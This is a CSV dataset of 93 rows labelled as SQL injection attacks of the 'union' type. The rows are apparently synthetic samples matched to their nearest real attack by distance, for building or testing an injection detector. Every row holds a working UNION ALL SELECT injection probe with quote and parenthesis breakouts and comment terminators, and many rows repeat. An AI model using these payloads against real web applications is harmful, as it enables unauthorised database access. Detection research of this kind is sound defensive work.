id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000001,attack,union,"-2319 union all select 5068,5068,5068#",nearest_attack_euclidean,R000009,6.882519115095534
CTGAN_000002,attack,union,"-6600'  )   union all select 5566,5566#",nearest_attack_euclidean,R000157,8.113620093227354
CTGAN_000003,attack,union,"-9509  )   union all select 1193,1193,1193#",nearest_attack_euclidean,R000096,6.741097384243853
CTGAN_000004,attack,union,"1' union all select null,null--",nearest_attack_euclidean,R000292,7.27898270017118
CTGAN_000005,attack,union,"-6600'  )   union all select 5566,5566#",nearest_attack_euclidean,R000157,6.261671867177892
CTGAN_000006,attack,union,1'   )    )    union all select null#,nearest_attack_euclidean,R000244,6.034696164552706
CTGAN_000007,attack,union,"1""  )   union all select null,null,null--",nearest_attack_euclidean,R000291,5.86416851367762
CTGAN_000008,attack,union,"1  )   union all select null,null,null--",nearest_attack_euclidean,R000141,6.452797739421555
CTGAN_000009,attack,union,"-5227"" union all select 2666--",nearest_attack_euclidean,R000253,6.450438691331165
CTGAN_000010,attack,union,"1  )   union all select null,null,null,null#",nearest_attack_euclidean,R000063,5.987363445495468
CTGAN_000011,attack,union,"-1413""  )   union all select 6651,6651,6651--",nearest_attack_euclidean,R000276,8.791425835504102
CTGAN_000012,attack,union,"1' union all select null,null#",nearest_attack_euclidean,R000034,6.013912907713799
CTGAN_000013,attack,union,"-2225' union all select 1545,1545,1545,1545#",nearest_attack_euclidean,R000027,5.100284056980636
CTGAN_000014,attack,union,1  )   where 9446  =  9446 union all select null#,nearest_attack_euclidean,R000280,8.201366930755416
CTGAN_000015,attack,union,"-5643'   )    )    union all select 1515,1515#",nearest_attack_euclidean,R000197,7.694684476946396
CTGAN_000016,attack,union,"1""  )   union all select null,null--",nearest_attack_euclidean,R000146,5.385835187156819
CTGAN_000017,attack,union,"1' union all select null,null,null--",nearest_attack_euclidean,R000010,7.5911748088811795
CTGAN_000018,attack,union,"-5313'  )   union all select 7187,7187,7187#",nearest_attack_euclidean,R000024,7.055133622044292
CTGAN_000019,attack,union,"-9718%""  )   union all select 9515,9515,9515#",nearest_attack_euclidean,R000261,4.640396417050214
CTGAN_000020,attack,union,1'  )   union all select null#,nearest_attack_euclidean,R000103,7.02522539699298
CTGAN_000021,attack,union,"-2046'  )   union all select 6668,6668--",nearest_attack_euclidean,R000170,7.626383596889702
CTGAN_000022,attack,union,"1 union all select null,null,null,null#",nearest_attack_euclidean,R000306,5.230812489862669
CTGAN_000023,attack,union,"-5572""  )   union all select 8131,8131#",nearest_attack_euclidean,R000039,5.804423088856157
CTGAN_000024,attack,union,"-1630' union all select 1971,1971--",nearest_attack_euclidean,R000263,4.573502998744292
CTGAN_000025,attack,union,"-1451%'  )   union all select 7666,7666,7666#",nearest_attack_euclidean,R000245,7.063886658042342
CTGAN_000026,attack,union,"1  )   union all select null,null--",nearest_attack_euclidean,R000069,5.78771218790527
CTGAN_000027,attack,union,"-5826""   )    )    union all select 7192,7192#",nearest_attack_euclidean,R000160,6.097309753595537
CTGAN_000028,attack,union,"-6122""  )   union all select 6578,6578--",nearest_attack_euclidean,R000070,5.88728938416016
CTGAN_000029,attack,union,"1%'  )   union all select null,null,null#",nearest_attack_euclidean,R000156,6.769340840583713
CTGAN_000030,attack,union,-9434'  )   union all select 3106#,nearest_attack_euclidean,R000284,5.282490825516795
CTGAN_000031,attack,union,"-5313'  )   union all select 7187,7187,7187#",nearest_attack_euclidean,R000024,6.565835475953849
CTGAN_000032,attack,union,"-7371'  )   union all select 4531,4531,4531#",nearest_attack_euclidean,R000004,5.671251961900957
CTGAN_000033,attack,union,"-6600'  )   union all select 5566,5566#",nearest_attack_euclidean,R000157,4.835216164449357
CTGAN_000034,attack,union,-3988'   )    )    union all select 1113#,nearest_attack_euclidean,R000185,6.435516125334807
CTGAN_000035,attack,union,"-1451%'  )   union all select 7666,7666,7666#",nearest_attack_euclidean,R000245,6.896003560797417
CTGAN_000036,attack,union,"-5313'  )   union all select 7187,7187,7187#",nearest_attack_euclidean,R000024,6.152139345157632
CTGAN_000037,attack,union,"-3437  )   union all select 7774,7774,7774--",nearest_attack_euclidean,R000288,6.070092052046691
CTGAN_000038,attack,union,"1  )   union all select null,null--",nearest_attack_euclidean,R000069,5.841517540719317
CTGAN_000039,attack,union,"1 union all select null,null,null,null--",nearest_attack_euclidean,R000191,6.382285896805635
CTGAN_000040,attack,union,"1   )    )    union all select null,null,null--",nearest_attack_euclidean,R000104,6.474237162507432
CTGAN_000041,attack,union,"-3952'  )   union all select 6644,6644,6644--",nearest_attack_euclidean,R000237,5.049227624565027
CTGAN_000042,attack,union,"-8349  )   union all select 8126,8126#",nearest_attack_euclidean,R000016,7.797293055045572
CTGAN_000043,attack,union,"-9509  )   union all select 1193,1193,1193#",nearest_attack_euclidean,R000096,6.33220754263374
CTGAN_000044,attack,union,"-2111' union all select 1061,1061,1061--",nearest_attack_euclidean,R000099,5.8553208868778075
CTGAN_000045,attack,union,"1""  )   union all select null,null,null#",nearest_attack_euclidean,R000188,5.233927556505238
CTGAN_000046,attack,union,"-3437  )   union all select 7774,7774,7774--",nearest_attack_euclidean,R000288,6.969283626510071
CTGAN_000047,attack,union,"-5572""  )   union all select 8131,8131#",nearest_attack_euclidean,R000039,8.293873074853686
CTGAN_000048,attack,union,"-3781  )   union all select 3916,3916,3916--",nearest_attack_euclidean,R000159,5.2397047577418725
CTGAN_000049,attack,union,"-2225' union all select 1545,1545,1545,1545#",nearest_attack_euclidean,R000027,5.617865577795915
CTGAN_000050,attack,union,"-8124  )   union all select 7251,7251,7251#",nearest_attack_euclidean,R000221,5.2987597501559245
CTGAN_000051,attack,union,"-6662""   )    )    union all select 6755--",nearest_attack_euclidean,R000076,5.211625915213944
CTGAN_000052,attack,union,-3988'   )    )    union all select 1113#,nearest_attack_euclidean,R000185,6.0712806375490045
CTGAN_000053,attack,union,"1%'  )   union all select null,null#",nearest_attack_euclidean,R000203,6.9462489941868055
CTGAN_000054,attack,union,"1""   )    )    union all select null,null,null#",nearest_attack_euclidean,R000248,6.534657890324906
CTGAN_000055,attack,union,"-6600'  )   union all select 5566,5566#",nearest_attack_euclidean,R000157,5.6585364682372195
CTGAN_000056,attack,union,-8143  )   union all select 3014--,nearest_attack_euclidean,R000029,5.020235872077874
CTGAN_000057,attack,union,1%'  )   union all select null--,nearest_attack_euclidean,R000163,5.8045714940679565
CTGAN_000058,attack,union,"1'  )   union all select null,null,null--",nearest_attack_euclidean,R000302,7.8269434128291095
CTGAN_000059,attack,union,"-5313'  )   union all select 7187,7187,7187#",nearest_attack_euclidean,R000024,5.766889927032285
CTGAN_000060,attack,union,"-4692%""   )    )    union all select 1781,1781#",nearest_attack_euclidean,R000249,5.040880317870343
CTGAN_000061,attack,union,"-2046'  )   union all select 6668,6668--",nearest_attack_euclidean,R000170,5.926075698635946
CTGAN_000062,attack,union,"-6600'  )   union all select 5566,5566#",nearest_attack_euclidean,R000157,4.155331255556352
CTGAN_000063,attack,union,"-5643'   )    )    union all select 1515,1515#",nearest_attack_euclidean,R000197,7.238567774072104
CTGAN_000064,attack,union,"1%'  )   union all select null,null,null#",nearest_attack_euclidean,R000156,7.120517017903529
CTGAN_000065,attack,union,"-2782"" union all select 2109,2109,2109#",nearest_attack_euclidean,R000297,6.0957513700765
CTGAN_000066,attack,union,"-1630' union all select 1971,1971--",nearest_attack_euclidean,R000263,5.744253407585362
CTGAN_000067,attack,union,"-2140   )    )    union all select 8174,8174,8174#",nearest_attack_euclidean,R000083,6.265946388408386
CTGAN_000068,attack,union,"-1413""  )   union all select 6651,6651,6651--",nearest_attack_euclidean,R000276,7.664807833660802
CTGAN_000069,attack,union,"-6600'  )   union all select 5566,5566#",nearest_attack_euclidean,R000157,4.411339071075971
CTGAN_000070,attack,union,"1%'  )   union all select null,null,null#",nearest_attack_euclidean,R000156,8.11359099781421
CTGAN_000071,attack,union,"-7371'  )   union all select 4531,4531,4531#",nearest_attack_euclidean,R000004,6.964682837029274
CTGAN_000072,attack,union,"-1451%'  )   union all select 7666,7666,7666#",nearest_attack_euclidean,R000245,5.945738611366226
CTGAN_000073,attack,union,"-9347'  )   union all select 3884,3884#",nearest_attack_euclidean,R000091,5.258338277762878
CTGAN_000074,attack,union,"1'  )   union all select null,null,null,null,null#",nearest_attack_euclidean,R000119,8.431144057133759
CTGAN_000075,attack,union,"1  )   union all select null,null,null--",nearest_attack_euclidean,R000141,7.681980915314328
CTGAN_000076,attack,union,"-2365   )    )    union all select 8190,8190#",nearest_attack_euclidean,R000305,9.719926956807047
CTGAN_000077,attack,union,"-5826""   )    )    union all select 7192,7192#",nearest_attack_euclidean,R000160,7.7821363063573274
CTGAN_000078,attack,union,-3598  )   union all select 2264#,nearest_attack_euclidean,R000007,6.696832920179521
CTGAN_000079,attack,union,"1%'  )   union all select null,null,null--",nearest_attack_euclidean,R000052,5.824904121989924
CTGAN_000080,attack,union,"-6600'  )   union all select 5566,5566#",nearest_attack_euclidean,R000157,5.817683580457761
CTGAN_000081,attack,union,"1  )   union all select null,null--",nearest_attack_euclidean,R000069,5.845244722645019
CTGAN_000082,attack,union,"-3445 union all select 5505,5505,5505--",nearest_attack_euclidean,R000087,6.73448122719763
CTGAN_000083,attack,union,"-1475""  )   union all select 8611,8611,8611#",nearest_attack_euclidean,R000094,5.196297353667627
CTGAN_000084,attack,union,"1  )   union all select null,null,null#",nearest_attack_euclidean,R000093,6.2311702521540315
CTGAN_000085,attack,union,-4171'  )   union all select 6136#,nearest_attack_euclidean,R000262,5.42938426310144
CTGAN_000086,attack,union,"1  )   union all select null,null,null--",nearest_attack_euclidean,R000141,6.757973347850732
CTGAN_000087,attack,union,"1   )    )    union all select null,null,null--",nearest_attack_euclidean,R000104,7.914934394893712
CTGAN_000088,attack,union,"-8349  )   union all select 8126,8126#",nearest_attack_euclidean,R000016,5.339133126892058
CTGAN_000089,attack,union,"-9509  )   union all select 1193,1193,1193#",nearest_attack_euclidean,R000096,5.827738115262218
CTGAN_000090,attack,union,"-9509  )   union all select 1193,1193,1193#",nearest_attack_euclidean,R000096,6.443546747995876
CTGAN_000091,attack,union,"1' union all select null,null,null--",nearest_attack_euclidean,R000010,7.89691258482391
CTGAN_000092,attack,union,"1   )    )    union all select null,null,null--",nearest_attack_euclidean,R000104,6.840492775383251
CTGAN_000093,attack,union,"-1630' union all select 1971,1971--",nearest_attack_euclidean,R000263,4.8852588675451445
